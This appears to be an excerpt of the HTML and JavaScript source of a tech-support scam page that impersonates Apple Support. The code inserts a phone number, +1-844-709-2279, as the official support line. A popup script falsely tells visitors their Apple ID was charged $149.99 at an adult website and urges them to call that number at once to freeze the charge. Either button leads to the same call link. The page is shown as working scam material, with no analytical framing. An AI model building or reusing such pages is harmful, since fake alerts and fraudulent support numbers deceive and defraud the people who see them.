...
<body>
            ...
            <div class="ac-ln-wrapper">
                ...
                <div class="ac-ln-content">
                    <span class="ac-ln-title">
                       <a href="tel:<script>document.write(phone)</script>">Apple Support <script>document.write(phone)</script> <font color="red"><font class="js_setPhoneBlock"></font></font></a>
					 </span>
    ...
    <footer id="ac-globalfooter" class="no-js">
        <div class="ac-gf-content">
            <section class="ac-gf-footer">
                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">pornhub.com </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                </div>
    ...
    <script>
        ...
        window.number = (window.number ? window.number : '+1-844-709-2279');
      ...
      //  window.refef = parseURL(document.referrer);
        ...
        function okkkk() {
            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-844-709-2279"></a>');
        ...
        function myFunction() {
            if (confirm("Your Apple ID was recently used at porhub.com for $149.99 via Apple Pay  Pre-Authorisation. We have placed the request on hold to ensure safety and security. Not you? Immediately Call Apple Support at  "+ phone + " to Freeze it!.")) {
                okkkk();
            } else {
                okkkk();
            }
